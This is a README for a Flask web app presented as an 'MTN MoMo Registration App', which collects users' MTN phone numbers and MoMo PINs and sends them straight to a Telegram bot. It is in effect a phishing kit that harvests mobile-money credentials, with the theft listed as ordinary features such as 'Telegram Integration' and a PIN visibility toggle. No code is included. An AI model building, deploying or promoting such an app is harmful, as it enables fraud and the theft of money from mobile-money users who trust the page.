# MTN MoMo Registration App

A Flask-based web application that collects MTN numbers and MoMo PINs and sends them to a Telegram bot instantly upon registration.

![App Screenshot](images/screenshot.png)

## 📸 Images

The `images/` folder contains:
- `screenshot.png` - App screenshot for README
- `logo.png` - Logo displayed in the app header

### Adding Your Images

1. Place your logo as `images/logo.png`
2. Place your screenshot as `images/screenshot.png`
3. Images will automatically display in the app

## 🚀 Features

- **Clean & Modern UI** - Responsive design inspired by the provided mockup
- **Real-time Validation** - Instant feedback on form inputs
- **Telegram Integration** - Securely sends registration data to your Telegram bot
- **PIN Visibility Toggle** - Show/hide PIN for convenience
- **Mobile Responsive** - Works on all devices
- **Rate Limiting** - Prevents abuse with request limits
- **Health Checks** - Monitor application status
- **Image Support** - Logo and screenshot display
